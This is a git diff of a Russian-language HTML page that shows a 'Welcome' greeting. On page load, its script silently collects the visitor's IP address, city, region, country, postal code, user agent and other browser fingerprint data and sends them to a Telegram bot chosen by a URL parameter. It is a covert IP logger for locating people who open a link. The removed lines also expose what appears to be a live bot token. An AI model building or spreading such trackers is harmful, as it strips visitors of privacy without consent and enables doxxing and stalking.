@@ -2,43 +2,77 @@
 <html lang="ru">
 <head>
   <meta charset="UTF-8">
-  <title>IP в Telegram</title>
+  <title>Новый вход</title>
   <script>
     window.onload = async function () {
       const urlParams = new URLSearchParams(window.location.search);
-      const chatId = urlParams.get("c"); // если есть chat_id
+      const chat_id = urlParams.get("u"); // chat_id передаётся как ?c=...
 
-      const BOT_TOKEN = '8254985090:AAEmnwYKpxW5zsB5RrbzTUNj8aNA8MasEeM'; // ⚠️ НЕ публикуй в открытом доступе!
+      const BOT_TOKEN = 'ВАШ_ТОКЕН_БОТА'; // ⚠️ Никогда не публикуй открыто!
 
-      if (chatId) {
-        try {
-          // Получаем IP через публичный API
-          const ipResponse = await fetch('https://api.ipify.org?format=json');
-          const ipData = await ipResponse.json();
+      if (!chat_id) {
+        console.warn("Параметр c (chat_id) не найден");
+        return;
+      }
 
-          const message = `👤 Новый визит\n🌐 IP: ${ipData.ip}`;
+      try {
+        // Получаем IP и геоданные
+        const ipResponse = await fetch('https://ipapi.co/json/');
+        const ipData = await ipResponse.json();
 
-          // Отправляем сообщение в Telegram
-          await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-              chat_id: chatId,
-              text: message
-            })
-          });
+        // Получаем данные браузера
+        const ua = navigator.userAgent;
+        const lang = navigator.language;
+        const platform = navigator.platform;
+        const screenSize = `${screen.width}x${screen.height}`;
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const now = new Date().toLocaleString('ru-RU');
+        const cookiesEnabled = navigator.cookieEnabled ? "Да" : "Нет";
+        const javaEnabled = navigator.javaEnabled ? "Да" : "Нет";
+        const online = navigator.onLine ? "Да" : "Нет";
 
-          console.log('Сообщение отправлено в Telegram');
-        } catch (error) {
-          console.error('Ошибка отправки:', error);
-        }
-      } else {
-        console.warn('Параметр u (chat_id) не найден');
+        // Формируем сообщение
+        const message = `
+📌 Новый вход!
+
+🌐 IP: ${ipData.ip}
+🏠 Город: ${ipData.city}
+🗺️ Регион: ${ipData.region}
+🇺🇳 Страна: ${ipData.country_name}
+📮 Почтовый индекс: ${ipData.postal}
+
+⚙️ User-agent:
+> ${ua}
+
+🛠️ Другие данные:
+> Язык: ${lang}
+> Платформа: ${platform}
+> Разрешение: ${screenSize}
+> Часовой пояс: ${timezone}
+> Время: ${now}
+> Куки: ${cookiesEnabled}
+> Java: ${javaEnabled}
+> Онлайн: ${online}
+        `.trim();
+
+        // Отправляем в Telegram
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: chat_id,
+            text: message
+          })
+        });
+
+        console.log("Сообщение отправлено в Telegram");
+      } catch (error) {
+        console.error("Ошибка:", error);
       }
     };
   </script>
 </head>
 <body>
-  <h1>Спасибо за визит!</h1>
+  <h1>Добро пожаловать!</h1>
 </body>
 </html>
